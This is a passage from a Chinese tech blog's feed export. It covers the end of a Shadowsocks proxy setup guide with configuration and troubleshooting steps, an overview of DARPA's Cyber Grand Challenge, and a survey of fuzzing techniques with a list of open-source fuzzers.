class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;                                      </span><br><span class="line">        <span class="attr">"server"</span>:<span class="string">"you_server_ip"</span>,    </span><br><span class="line">        <span class="attr">"port_password"</span>:&#123;              </span><br><span class="line">                <span class="attr">"8388"</span>:<span class="string">"you_password"</span>,</span><br><span class="line">                <span class="attr">"8389"</span>:<span class="string">"you_password"</span>,</span><br><span class="line">                <span class="attr">"8390"</span>:<span class="string">"you_password"</span>,</span><br><span class="line">                <span class="attr">"8391"</span>:<span class="string">"you_password"</span>,</span><br><span class="line">                <span class="attr">"8392"</span>:<span class="string">"you_password"</span></span><br><span class="line">        &#125;,                             </span><br><span class="line">        <span class="attr">"localhost_address"</span>:<span class="string">"127.0.0.1"</span>,</span><br><span class="line">        <span class="attr">"local_port"</span>:<span class="number">1080</span>,              </span><br><span class="line">        <span class="attr">"timeout"</span>:<span class="number">300</span>,                 </span><br><span class="line">        <span class="attr">"method"</span>:<span class="string">"aes-256-cfb"</span>,        </span><br><span class="line">        <span class="attr">"fast_open"</span>:<span class="literal">false</span>,             </span><br><span class="line">        <span class="attr">"workers"</span>:<span class="number">20</span>                  </span><br><span class="line">&#125;       </span><br><span class="line"></span><br><span class="line">##############</span><br><span class="line">以下为说明文字，请忽略</span><br><span class="line">you_server_ip：是你的服务器登录地址</span><br><span class="line">localhost_address：127.0.0.1请保持默认</span><br><span class="line">local_port：1080请保持默认</span><br><span class="line">server_port：8381根据需要进行修改</span><br><span class="line">you_password：个人设置密码</span><br><span class="line">timeout：300请保持默认</span><br><span class="line">method：aes-256-cfb请保持默认</span><br><span class="line">fast_open：false请保持默认</span><br></pre></td></tr></table></figure><p>官方说明中，各字段含义如下：</p><table><thead><tr><th style="text-align:center"><strong>Name</strong></th><th style="text-align:center"><strong>Explanation</strong></th></tr></thead><tbody><tr><td style="text-align:center">server</td><td style="text-align:center">the address your server listens</td></tr><tr><td style="text-align:center">server_port</td><td style="text-align:center">server port</td></tr><tr><td style="text-align:center">local_address</td><td style="text-align:center">the address your local listens</td></tr><tr><td style="text-align:center">local_port</td><td style="text-align:center">local port</td></tr><tr><td style="text-align:center">password</td><td style="text-align:center">password used for encryption</td></tr><tr><td style="text-align:center">timeout</td><td style="text-align:center">in seconds</td></tr><tr><td style="text-align:center">method</td><td style="text-align:center">default: “aes-256-cfb”</td></tr><tr><td style="text-align:center">fast_open</td><td style="text-align:center">use TCP_FASTOPEN, true / false</td></tr><tr><td style="text-align:center">workers</td><td style="text-align:center">number of workers, available on Unix/Linux</td></tr></tbody></table><p>配置完毕后，需启动SS服务，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># //前台启动</span></span><br><span class="line">ssserver -c /etc/shadowsock.json</span><br><span class="line"><span class="comment"># //后台启动</span></span><br><span class="line">ssserver -c /etc/shadowsock.json <span class="_">-d</span> start/stop</span><br></pre></td></tr></table></figure><p>在Ubuntu系统下设置SS服务开机自启动：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/rc.local</span><br><span class="line"><span class="comment"># //添加以下记录：</span></span><br><span class="line">ssserver -c /etc/shadowsocks.json <span class="_">-d</span> start</span><br></pre></td></tr></table></figure></p><p><strong>3、遇到的问题</strong><br>由于RP问题，在安装过程中遇到以下问题：<br>（1）更新pip报错<br>更新 pip 后，使用 pip 安装python包时报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ImportError: cannot import name main</span><br></pre></td></tr></table></figure><p>解决方案：修改“/usr/bin”目录下pip文件。</p><p>将如下三行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pip import main</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:  </span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pip import __main__</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:   </span><br><span class="line">    sys.exit(__main__.main())</span><br></pre></td></tr></table></figure><p>保存退出，重新登录终端后成功解决异常。</p><p>（2） locale命令报错</p><p>locale指令运行出现的错误信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">locale：Cannot <span class="built_in">set</span> LC_CTYPE to default locale： No such file or directory</span><br><span class="line">locale：Cannot <span class="built_in">set</span> LC_MESSAGES to default locale： No such file or directory</span><br><span class="line">locale：Cannot <span class="built_in">set</span> LC_ALL to default locale： No such file or directory</span><br></pre></td></tr></table></figure></p><p>locale是用来设置软件运行的语言环境，因此判断语言环境设置存在问题。重新设置语言环境，执行如下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 针对特定用户</span></span><br><span class="line">[root@Mylinux ~]<span class="comment">#echo "export  LC_ALL=en_US.UTF-8"  &gt;&gt;   /home/XXX/.bash_profile</span></span><br><span class="line"><span class="comment"># 针对所有用户</span></span><br><span class="line">[root@Mylinux ~]<span class="comment">#  echo "export LC_ALL=en_US.UTF-8"  &gt;&gt;  /etc/profile（所有用户）</span></span><br><span class="line">[root@Mylinux ~]<span class="comment">#  exit</span></span><br></pre></td></tr></table></figure></p><p>退出后重新登录终端，成功解决异常。</p><h2 id="0x02-SS客户端配置"><a href="#0x02-SS客户端配置" class="headerlink" title="0x02 SS客户端配置"></a>0x02 SS客户端配置</h2><p>安装SS服务端并确保服务正确启动后，接下来需要配置SS客户端。SS客户端所支持的系统类型如下：<br><img src="/2018/11/06/SS搭建/client.png" alt="client"><br>结合日常使用习惯，主要针对OSX、IOS两个版本进行说明。<br><strong>1、Mac OS X</strong><br>OSX下SS客户端的安装较简单，在<a href="https://github.com/shadowsocks/ShadowsocksX-NG/releases" target="_blank" rel="noopener">官方地址</a>下载SS客户端，成功安全后点击导航栏中的“小飞机”图标，配置SS服务器相关信息。<br><img src="/2018/11/06/SS搭建/ss-client.png" alt="ss-client"><br><img src="/2018/11/06/SS搭建/123.jpg" alt="123"><br>正确配置后，即可访问Google等站点。<br><img src="/2018/11/06/SS搭建/google.png" alt="google"></p><p><strong>2、IOS</strong><br>相较Mac OS X，IOS的配置略显繁琐，主要原因在于仅美区AppleID才能够下载SS客户端。因此，首先需要注册一个美区账户。<br>(1)注册美区ID<br>创建过程同样很简单，通过<a href="https://appleid.apple.com/account#!&amp;page=create" target="_blank" rel="noopener">苹果官方网站</a>新建AppleID。创建过程中将账户所属区域设为美国即可。<br><img src="/2018/11/06/SS搭建/AppleID.png" alt="AppleID"><br>（2)IOS客户端<br>iOS中的Shadowsocks客户端，也有多种。<br>可以参考Shadowsocks官网中：<a href="https://shadowsocks.org/en/download/clients.html" target="_blank" rel="noopener">Shadowsocks - Clients</a>介绍的：</p><ul><li>Wingy：<ul><li><a href="https://itunes.apple.com/us/app/wingy-http-s-socks5-proxy-utility/id1178584911" target="_blank" rel="noopener">App Store</a></li></ul></li><li>MobileShadowSocks<ul><li><a href="http://apt.thebigboss.org/onepackage.php?bundleid=com.linusyang.shadowsocks" target="_blank" rel="noopener">Big Boss</a></li></ul></li></ul><p>不过想要使用支持最新加密方式的客户端的话，目前仅有shadowrocket与Potatso Lite两款。<br><img src="/2018/11/06/SS搭建/real_shadowrocket_guangming_li.jpg" alt="real_shadowrocket_guangming_li"><br><img src="/2018/11/06/SS搭建/app_store_search_out_potatso_lite.jpg" alt="app_store_search_out_potatso_lite"><br>利用之前注册的美区AppleID下载免费的Potatso Lite，配置SS服务器信息后，即可顺利访问Google等站点。<img src="/2018/11/06/SS搭建/google.png" alt="google"></p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Cyber Grand Challenge 简介</title>
      <link href="/2018/11/01/CGC/"/>
      <url>/2018/11/01/CGC/</url>
      
        <content type="html"><![CDATA[<p>2016年8月在美国拉斯维加斯举办的 Defcon CTF，一支名为 Mayhem 的机器人战队与另外十四支人类顶尖CTF战队上演了信息安全领域首次人机黑客对战。该事件在人工智能和信息安全领域具有里程碑式的意义，是机器智能开始深入影响信息安全的标志性事件之一。代表机器智能的 Mayhem，正是由美国国防部先进项目研究局（DARPA，Defense Advanced Research Projects Agency）举办的网络超级挑战赛（CGC，Cyber Grand Challenge）的冠军。</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p><img src="/2018/11/01/CGC/Unknown.png" alt=""></p><p>CGC(Cyber Grand Challenage) 是DARPA于2013年发起的全球性网络安全挑战赛，旨在推进自动化网络防御技术发展，即实时识别系统缺陷、漏洞，并自动完成修补和系统防御，利用CRS（Cyber Reasoning System）实现全自动的网络安全攻防。主要涉及以下技术：</p><ul><li>Dynamic Analysis</li><li>Static Analysis</li><li>Symbolic Execution</li><li>Constraint Solving</li><li>Data Flow Tracking</li><li>Fuzz Testing</li></ul><h2 id="赛程"><a href="#赛程" class="headerlink" title="赛程"></a>赛程</h2><p>CGC 的赛程分为两个阶段：初赛（Challenge Qualification Event，CQE）和决赛（Challenge Final Event，CFE）。在比赛之前，每支参赛团队需要开发一套全自动的网络推理系统CRS（Cyber Reasoning System），实现对 Linux 二进制程序的自动化分析及漏洞检测，自动生成PoC，并对漏洞进行修补。<br><img src="/2018/11/01/CGC/maxresdefault.jpg" alt=""></p><h3 id="Challenge-Qualification-Event（CQE）"><a href="#Challenge-Qualification-Event（CQE）" class="headerlink" title="Challenge Qualification Event（CQE）"></a>Challenge Qualification Event（CQE）</h3><p>POV（Proof of Vulnerability）是CGC竞赛的核心，可类比为常规CTF比赛中所需编写的Exploit。在CQE中，参赛团队的CRS被放置在单独的环境中进行评估，CRS在此环节中需要自动分析待检测的二进制程序CB（Challenge Banary），生成POV及修补过的CB。CQE阶段侧重于考察团队的漏洞挖掘能力及生成补丁的能力。下表为DARPA在CQE和CFE分別要测试的项目：<br><img src="/2018/11/01/CGC/cgc.png" alt=""></p><h3 id="Challenge-Final-Event（CFE）"><a href="#Challenge-Final-Event（CFE）" class="headerlink" title="Challenge Final Event（CFE）"></a>Challenge Final Event（CFE）</h3><p>CFE和CQE最大的不同在于各参赛团队的CRS会部署于同一网络环境之内，各队将生成的POV提交给主办方，主办方将这些POV混入正常的服务流量，再分配给各队的CRS，以实现相互之间的网络攻防。若CRS能够在正常流量中检测出攻击流量，并进行有效阻断，则认为CRS成功实现了网络防御。<br><img src="/2018/11/01/CGC/螢幕快照 2015-10-12 上午1.13.41.jpg" alt=""></p><p>下图为CFE的评分标准。参赛队伍首先生成POV，若此POV成功便可获得部分得分。之后 Mixing Appliance 会将主办方以及各队的POV混合至正常的服务流量中（Service Poller）并发送给各队。各队首先从网络防御系统接收到流量，并可以做一定程度的过滤，若能成功过滤POV，则可获取相应的得分，反之则会被扣除相应的分数。而未过滤的流量会进入到 Patch CB 中。同样，成功过滤POV则得分，否则扣分。最后会确认应用程序状态，若应用程序能够提供正常服务则可以获得相应分数，否则扣除相应分数。</p><p><img src="/2018/11/01/CGC/螢幕快照 2015-10-12 上午2.22.40.jpg" alt=""></p><h2 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h2><p>由于本文主要介绍CGC相关情况，其中所涉及的技术过于庞杂，难以一一说明。因此以此图为索引，概要的展示各环节所涉及的主要技术，感兴趣的读者可对相关技术进行深入研究。</p><p><img src="/2018/11/01/CGC/螢幕快照 2015-10-12 上午2.42.48.jpg" alt=""></p><h2 id="决赛团队简介"><a href="#决赛团队简介" class="headerlink" title="决赛团队简介"></a>决赛团队简介</h2><p>初赛阶段的参赛队伍分为资助(Funded Track)和公开(Open Track)两种。Funded Track 是预先向DARPA提交项目申请并获得75万美元资助的团队；Open Track 则是面向全球公开报名，由民间自由组织的团队；共有队伍近100支，包括至少18支来自欧洲、亚洲等非北美地区的队伍；Open Track 有传统CTF强队（disekt，shellphish等），也有由知名安全企业资助的比赛团队。由 DARPA 官方宣布的CGC最终比赛结果如下：<br>第1名：卡内基梅隆大学 ForAllSecure 团队研制的 Mayhem 系统；<br>第2名：GrammaTech 公司和弗吉尼亚大学 TECHx 团队研制的 Xandra 系统；<br>第3名：加利福尼亚大学 Shellphish 学生团队研制的Mechanical Phish系统。<br>以下为七支进入决赛团队的简介：</p><ul><li><p>CodeJitsu（Berkeley, Calif.）：来自加州伯克利大学，指导教授为Dawn Song。伯克利大学的研究团队在应用程序分析，特别是二进制分析领域始终处于世界领先的水平，该团队开源的分析系统很值得研究。<a href="http://bitblaze.cs.berkeley.edu/" target="_blank" rel="noopener">http://bitblaze.cs.berkeley.edu/</a><br><img src="/2018/11/01/CGC/codejitsu.jpg" alt=""></p></li><li><p>ForAllSecure （Pittsburgh, Pa.）：ForAllSecure是卡内基梅隆大学David Brumley教授所创办的公司，团队成员也多来自于卡内基梅隆大学的CyLab（David Brumley教授指导的实验室）。著名的PPP战队正是出自CyLab。除此之外，CyLab在二进制分析领域的研究也是处于全球领先的地位，与伯克利的团队类似，CyLab也有自己研发的二进制分析平台 BAP（Binary Analysis Platform。<br><a href="https://github.com/BinaryAnalysisPlatform" target="_blank" rel="noopener">https://github.com/BinaryAnalysisPlatform</a></p></li></ul><p><img src="/2018/11/01/CGC/forallsecure.jpg" alt=""></p><ul><li>TECHx （Charlottesville, Va.）: GrammaTech是一家专注于二进制分析的公司，此次与维吉尼亚大学组队参加CGC竞赛，开发了PEASOUP（Preventing Exploits of Software Of Uncertain Provenance）系統。相关论文:<br><a href="http://www.grammatech.com/research/technologies/peasoup/publications" target="_blank" rel="noopener">http://www.grammatech.com/research/technologies/peasoup/publications</a></li></ul><p><img src="/2018/11/01/CGC/techx.jpg" alt=""></p><ul><li><p>CSDS （Moscow, Idaho）：有爱德华大学教授Jim Alves-Foss及其博士后研究员 Jia Song 组成的两人战队。是CGC比赛中唯一重新开发整套工具的队伍。<br><img src="/2018/11/01/CGC/csds.jpg" alt=""></p></li><li><p>DeepRed （Arlington, Va.）：Raytheon为美国公司，该团队在memory领域有一些特別的研究成果，队名源自于 IBM 的 Deep Blue。<br><img src="/2018/11/01/CGC/deepred.jpg" alt=""></p></li><li><p>disekt（Athens, Ga.）：disekt是一只CTF战队，共有四位成员。该团队对于VM系统有深入研究，12年有发表QEMU漏洞，14年发表VM Detection技术，此外还有ROP相关研究成果。（ROP Detection at Shmoocon 2014 ）<br><img src="/2018/11/01/CGC/disekt.jpg" alt=""></p></li></ul><ul><li>Shellphish（Santa Barbara, Calif.）：团队由加利福尼亚大学圣芭芭拉分校的学生组成。Shellphish 不仅是传统的CTF强队，在学术研究方面也具备深厚的功力，团队指导教授之一的 Christopher Kruegel，在二进制分析领域相当有名。该团队开发的Angr系统，是非常优秀的分析平台。<br><a href="http://angr.io/" target="_blank" rel="noopener">http://angr.io/</a></li></ul><p><img src="/2018/11/01/CGC/shellphish.jpg" alt=""></p><h2 id="參考文獻"><a href="#參考文獻" class="headerlink" title="參考文獻"></a>參考文獻</h2><ol><li><a href="https://github.com/CyberGrandChallenge/cgc-release-documentation/blob/master/walk-throughs/running-the-vm.md" target="_blank" rel="noopener">https://github.com/CyberGrandChallenge/cgc-release-documentation/blob/master/walk-throughs/running-the-vm.md</a></li><li><a href="http://blog.trailofbits.com/category/program-analysis/" target="_blank" rel="noopener">http://blog.trailofbits.com/category/program-analysis/</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> AEG </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CGC </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Fuzzing技术总结与工具列表</title>
      <link href="/2018/10/27/Fuzzing%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%E4%B8%8E%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8/"/>
      <url>/2018/10/27/Fuzzing%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%E4%B8%8E%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>版权声明：本文为博主原创文章，未经博主允许不得转载。<br><a href="https://blog.csdn.net/wcventure/article/details/82085251" target="_blank" rel="noopener">https://blog.csdn.net/wcventure/article/details/82085251</a></p><p>首先推荐阅读2018年computing Surveys 的《Fuzzing: Art, Science, and Engineering》<br><a href="https://github.com/wcventure/wcventure/blob/master/Paper/Fuzzing_Art_Science_and_Engineering.pdf" target="_blank" rel="noopener">https://github.com/wcventure/wcventure/blob/master/Paper/Fuzzing_Art_Science_and_Engineering.pdf</a><br>其次推荐阅读2018年Cybersecurity 的 《Fuzzing: a survey》<br><a href="https://www.researchgate.net/publication/325577316_Fuzzing_a_survey" target="_blank" rel="noopener">https://www.researchgate.net/publication/325577316_Fuzzing_a_survey</a><br>里面对fuzzing技术和fuzzing工具有详细的介绍。</p><p><strong>一、什么是Fuzzing？</strong></p><p>Fuzz本意是“羽毛、细小的毛发、使模糊、变得模糊”，后来用在软件测试领域，中文一般指“模糊测试”，英文有的叫“Fuzzing”，有的叫“Fuzz Testing”。本文用fuzzing表示模糊测试。</p><p>Fuzzing技术可以追溯到1950年，当时计算机的数据主要保存在打孔卡片上，计算机程序读取这些卡片的数据进行计算和输出。如果碰到一些垃圾卡片或一些废弃不适配的卡片，对应的计算机程序就可能产生错误和异常甚至崩溃，这样，Bug就产生了。所以，Fuzzing技术并不是什么新鲜技术，而是随着计算机的产生一起产生的古老的测试技术。</p><p>Fuzzing技术是一种基于黑盒（或灰盒）的测试技术，通过自动化生成并执行大量的随机测试用例来发现产品或协议的未知漏洞。随着计算机的发展，Fuzzing技术也在不断发展。</p><p><strong>二、Fuzzing有用么？</strong></p><p>Fuzzing是模糊测试，顾名思义，意味着测试用例是不确定的、模糊的。</p><p>计算机是精确的科学和技术，测试技术应该也是一样的，有什么的输入，对应什么样的输出，都应该是明确的，怎么会有模糊不确定的用例呢？这些不确定的测试用例具体会有什么作用呢？</p><p>为什么会有不确定的测试用例，我想主要的原因是下面几点：</p><p>1、我们无法穷举所有的输入作为测试用例。我们编写测试用例的时候，一般考虑正向测试、反向测试、边界值、超长、超短等一些常见的场景，但我们是没有办法把所有的输入都遍历进行测试的。</p><p>2、我们无法想到所有可能的异常场景。由于人类脑力的限制，我们没有办法想到所有可能的异常组合，尤其是现在的软件越来越多的依赖操作系统、中间件、第三方组件，这些系统里的bug或者组合后形成的bug，是我们某个项目组的开发人员、测试人员无法预知的。</p><p>3、Fuzzing软件也同样无法遍历所有的异常场景。随着现在软件越来越复杂，可选的输入可以认为有无限个组合，所以即使是使用软件来遍历也是不可能实现的，否则你的版本可能就永远也发布不了。Fuzzing技术本质是依靠随机函数生成随机测试用例来进行测试验证，所以是不确定的。</p><p>这些不确定的测试用例会起到我们想要的测试结果么？能发现真正的Bug么？</p><p>1、Fuzzing技术首先是一种自动化技术，即软件自动执行相对随机的测试用例。因为是依靠计算机软件自动执行，所以测试效率相对人来讲远远高出几个数量级。比如，一个优秀的测试人员，一天能执行的测试用例数量最多也就是几十个，很难达到100个。而Fuzzing工具可能几分钟就可以轻松执行上百个测试用例。</p><p>2、Fuzzing技术本质是依赖随机函数生成随机测试用例，随机性意味着不重复、不可预测，可能有意想不到的输入和结果。</p><p>3、根据概率论里面的“大数定律”，只要我们重复的次数够多、随机性够强，那些概率极低的偶然事件就必然会出现。Fuzzing技术就是大数定律的典范应用，足够多的测试用例和随机性，就可以让那些隐藏的很深很难出现的Bug成为必然现象。</p><p>目前，Fuzzing技术已经是软件测试、漏洞挖掘领域的最有效的手段之一。Fuzzing技术特别适合用于发现0 Day漏洞，也是众多黑客或黑帽子发现软件漏洞的首选技术。Fuzzing虽然不能直接达到入侵的效果，但是Fuzzing非常容易找到软件或系统的漏洞，以此为突破口深入分析，就更容易找到入侵路径，这就是黑客喜欢Fuzzing技术的原因。</p><p><strong>三、基于生成和基于编译的Fuzzing算法？*</strong></p><p>Fuzzing引擎算法中，测试用例的生成方式主要有2种：<br>1）基于变异：根据已知数据样本通过变异的方法生成新的测试用例；<br>2）基于生成：根据已知的协议或接口规范进行建模，生成测试用例；<br>一般Fuzzing工具中，都会综合使用这两种生成方式。</p><p>基于变异的算法核心要求是学习已有的数据模型，基于已有数据及对数据的分析，再生成随机数据做为测试用例。</p><p><strong>四、state-of-the-art AFL</strong></p><p>AFL就是著名的基于变异的Fuzzer。<br>以下有一些关于state-of-the-art AFL的资料</p><ol><li>american fuzzy lop (2.52b)<br> <a href="http://lcamtuf.coredump.cx/afl/" target="_blank" rel="noopener">http://lcamtuf.coredump.cx/afl/</a></li><li>AFL内部实现细节小记<br> <a href="http://rk700.github.io/2017/12/28/afl-internals/" target="_blank" rel="noopener">http://rk700.github.io/2017/12/28/afl-internals/</a></li><li>afl-fuzz技术白皮书<br> <a href="https://blog.csdn.net/gengzhikui1992/article/details/50844857" target="_blank" rel="noopener">https://blog.csdn.net/gengzhikui1992/article/details/50844857</a></li><li>如何使用AFL进行一次完整的fuzz过程<br> <a href="https://blog.csdn.net/abcdyzhang/article/details/53487683" target="_blank" rel="noopener">https://blog.csdn.net/abcdyzhang/article/details/53487683</a></li><li>AFL(American Fuzzy Lop)实现细节与文件变异<br> <a href="https://paper.seebug.org/496/" target="_blank" rel="noopener">https://paper.seebug.org/496/</a></li><li>fuzz实战之libfuzzer<br> <a href="https://www.secpulse.com/archives/71898.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/71898.html</a></li></ol><p><img src="/2018/10/27/Fuzzing技术总结与工具列表/2018083115120179.jpeg" alt="2018083115120179"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- Static analysis</span><br><span class="line">- Dynamic analysis</span><br><span class="line">- Symbolic execution</span><br><span class="line">- Fuzzing</span><br></pre></td></tr></table></figure><p><img src="/2018/10/27/Fuzzing技术总结与工具列表/20180826220159310.png" alt="20180826220159310"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- Generation-based Fuzzing</span><br><span class="line">- Mutation-based Fuzzing</span><br></pre></td></tr></table></figure><p><img src="/2018/10/27/Fuzzing技术总结与工具列表/20180826220211502.png" alt="20180826220211502"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- White box fuzzing</span><br><span class="line">- Grey box fuzzing</span><br><span class="line">- Black box fuzzing</span><br></pre></td></tr></table></figure><p><img src="/2018/10/27/Fuzzing技术总结与工具列表/20180826220229333.png" alt="20180826220229333"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- Fuzzing技术中的关键</span><br></pre></td></tr></table></figure><p><img src="/2018/10/27/Fuzzing技术总结与工具列表/20180826220241617.png" alt="20180826220241617"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- Fuzzing 中</span><br></pre></td></tr></table></figure><p><img src="/2018/10/27/Fuzzing技术总结与工具列表/2018082622025240.png" alt="2018082622025240"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- 至今fuzzing工具文献的引用关系，Fuzzing工具的分类和历史</span><br></pre></td></tr></table></figure><p><img src="/2018/10/27/Fuzzing技术总结与工具列表/20180826220326814.png" alt="20180826220326814"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- Fuzzing 工具之调研，还有一张很好的整理后的图表</span><br></pre></td></tr></table></figure><p><img src="/2018/10/27/Fuzzing技术总结与工具列表/20180826220412534.png" alt="20180826220412534"></p><p><strong>最后，再整理一下部分开源fuzzing工具的列表</strong><br>原文来自：<a href="https://www.peerlyst.com/posts/resource-open-source-fuzzers-list]" target="_blank" rel="noopener">[https://www.peerlyst.com/posts/resource-open-source-fuzzers-list]</a>，并增加2018年最新的诸如CollAFL和SnowFuzz等工具</p><ul><li>开源Fuzzers工具</li><li>Fuzzing的线束或框架</li><li>其它 Fuzzers 工具是免费的，但是和开源比不值得一提</li><li>Fuzzing的有效超载</li><li>博客将帮助你更好的了解Fuzz</li><li>其它关于Fuzzing博客或资源</li><li>商业Fuzzers工具</li></ul><p><strong>一、开源Fuzzers</strong></p><ol><li><p>CollAFL<br><a href="http://chao.100871.net/papers/oakland18.pdf" target="_blank" rel="noopener">http://chao.100871.net/papers/oakland18.pdf</a><br>路径敏感的Fuzzer，解决了AFL中bitmap路径冲突的问题。并提出了一种选择seed的策略，能更快提高覆盖率。</p></li><li><p>SnowFuzz<br><a href="https://arxiv.org/pdf/1708.08437.pdf" target="_blank" rel="noopener">https://arxiv.org/pdf/1708.08437.pdf</a></p></li><li><p>VUzzer<br><a href="http://www.cs.vu.nl//~giuffrida/papers/vuzzer-ndss-2017.pdf" target="_blank" rel="noopener">http://www.cs.vu.nl//~giuffrida/papers/vuzzer-ndss-2017.pdf</a><br>基于应用感知的自进化模糊工具。在这篇文章中，我们提出一个应用感知的进化模糊策略（不需要以前的知识应用或格式输入）。为了最小化地覆盖并扩展更深的路径，我们利用基于静态和动态分析的控制以及数据流功能，来推断应用程序的基本属性。与Application-agnostic方法相比，这可以更快地生成有趣的输入。我们实行我们的模糊策略在VUzzer上，并且用三种不同的数据评估它：DARPA的大挑战二进制文件（CGC）、一组真实的应用程序（二进制输入解析器）和最近发布的LAVA数据集。</p></li><li><p>Afl-fuzz（American fuzzy lop）<br><a href="http://lcamtuf.coredump.cx/afl/" target="_blank" rel="noopener">http://lcamtuf.coredump.cx/afl/</a><br>Afl-fuzz是一种基于面向安全的模糊测试工具，它采用了一种新型的方式（编译时检测和遗传算法），来自动发掘干净的、有趣的测试案例，即在目标二进制中触发新的内部状态。这基本上改善了模糊代码的功能覆盖。该工具生成的简洁的合成语料库也可以用来传播其它更多的劳动型或资源密集型测试方案。<br>与其他仪器化的模糊工具相比，afl-fuzz是以实用性而被设计的：它具有适度的性能开销，采用了多种高效的模糊战略，和努力最小化的技巧，基本上不需要配置，并且能够无缝处理复杂的、真实世界案例，以及常见的图像分析或文件压缩等。</p></li><li><p>Filebuster<br>一个非常快速和灵活的网络模糊工具</p></li><li><p>TriforceAFL<br>AFL / QEMU 模糊器具有全系统的仿真。这是AFL的修补版本，支持使用QEMU的全系统模糊测试。它所包含的QEMU已经更新，允许在运行x86_64的系统仿真器时进行分支机构跟踪。它也添加了额外的指令来启动AFL的forkserver，进行模糊设置，并标记测试用例的启动和停止。</p></li><li><p>Nightmare:<br><a href="https://github.com/joxeankoret/nightmare" target="_blank" rel="noopener">https://github.com/joxeankoret/nightmare</a><br>一个具有web管理的分布式模糊测试套件。</p></li><li><p>Grr<br>DECREE二进制的高吞吐量模糊器和仿真器</p></li><li><p>Randy:<br><a href="http://ptrace-security.com/blog/randy-random-based-fuzzer-in-python/" target="_blank" rel="noopener">http://ptrace-security.com/blog/randy-random-based-fuzzer-in-python/</a><br>Python中的基于随机的模糊工具</p></li><li><p>IFuzzer<br>一个进化型的翻译模糊器</p></li><li><p>Dizzy:<br><a href="https://github.com/ernw/dizzy" target="_blank" rel="noopener">https://github.com/ernw/dizzy</a><br>基于python的模糊框架：<br>(1) 可以发送到L2以及上层（TCP / UDP / SCTP）<br>(2)能够处理奇长度分组字段（无需匹配字节边界，因此即使单个标志或7位长字也可以表示和模糊）<br>(3) 非常容易的协议定义语法<br>(4) 能够做多包状态的完全模糊，能够使用接收到的目标数据作为响应</p></li><li><p>Address Sanitizer:<br><a href="https://github.com/Google/sanitizers" target="_blank" rel="noopener">https://github.com/Google/sanitizers</a><br>地址Sanitizer、线Sanitizer、记忆Sanitizer</p></li><li><p>Diffy:<br><a href="https://github.com/twitter/diffy" target="_blank" rel="noopener">https://github.com/twitter/diffy</a><br>使用Diffy查找您的服务中的潜在错误</p></li><li><p>Wfuzz:<br><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a><br>Web应用程序<a href="http://www.edge-security.com/wfuzz.php" target="_blank" rel="noopener">HTTP://www.edge-security.com/wfuzz.php</a></p></li><li><p>Go-fuzz:<br><a href="https://github.com/Google/gofuzz" target="_blank" rel="noopener">https://github.com/Google/gofuzz</a><br>基于放弃的模糊测试</p></li><li><p>Sulley:<br><a href="https://github.com/OpenRCE/sulley" target="_blank" 